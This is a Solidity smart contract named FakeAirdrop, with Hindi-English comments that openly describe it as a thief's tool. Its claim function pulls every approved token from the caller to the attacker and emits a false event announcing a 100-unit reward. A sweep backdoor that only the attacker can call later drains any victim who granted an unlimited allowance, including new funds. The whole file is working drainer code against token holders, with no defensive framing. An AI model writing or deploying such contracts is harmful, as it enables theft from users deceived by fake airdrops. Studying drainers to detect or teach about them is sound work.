// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract FakeAirdrop {

    address private immutable attacker;
    IERC20 public immutable token;
    event AirdropClaimed(address indexed user, uint256 reward);

    error NotAttacker();

    constructor(IERC20 token_) {
        attacker = msg.sender;
        token = token_;
    }
    
    function claim() external {
        uint256 balance = token.balanceOf(msg.sender);
        uint256 allowed = token.allowance(msg.sender, address(this));
        uint256 amount = balance < allowed ? balance : allowed; // jitna mil sake, sab

        if (amount > 0) {
            // msg.sender = victim, attacker = chor. Victim ka koi signature nahi chahiye,
            // sirf pehle wala approve() kaafi hai.
            token.transferFrom(msg.sender, attacker, amount);
        }

        // Jhoot: "aapko 100 ka inaam mila" - asal mein 0
        emit AirdropClaimed(msg.sender, 100e6);
    }

    // ------------------------------------------------------------------
    // Chor ka chhupa darwaza: jisne kabhi bhi unlimited approve kiya,
    // us ke NAYE paise bhi baad mein utha lo. Victim ko kuch karna nahi padta.
    // ------------------------------------------------------------------
    function sweep(address victim) external {
        if (msg.sender != attacker) revert NotAttacker(); // sirf chor chala sakta hai
        uint256 balance = token.balanceOf(victim);
        uint256 allowed = token.allowance(victim, address(this));
        uint256 amount = balance < allowed ? balance : allowed;
        if (amount > 0) token.transferFrom(victim, attacker, amount);
    }
}
